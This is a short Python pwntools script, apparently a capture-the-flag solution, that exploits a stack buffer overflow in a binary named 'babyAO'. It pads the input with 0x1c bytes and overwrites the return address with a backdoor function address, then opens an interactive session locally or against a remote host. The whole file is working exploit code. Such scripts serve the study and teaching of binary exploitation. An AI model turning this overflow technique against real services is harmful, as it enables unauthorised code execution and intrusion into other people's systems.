from pwn import *
#选择环境，0为本地测试，1为远端测试
mode = 0

context.log_level = 'debug'

backdoor_addr = 0x8048516

payload ='a' * 0x1c + p32(backdoor_addr) + '\n'

remote_ip = "127.0.0.1"

port = "0"
#本地测试
if mode == 0:

	p = process("./babyAO")
	#gdb.attach(p,"b *0x8048589")
	p.sendlineafter("overflow?",payload)
	p.interactive()
#远端测试
else:
	p = remote(remote_ip,port)
	p.sendlineafter("overflow?",payload)
	p.interactive()

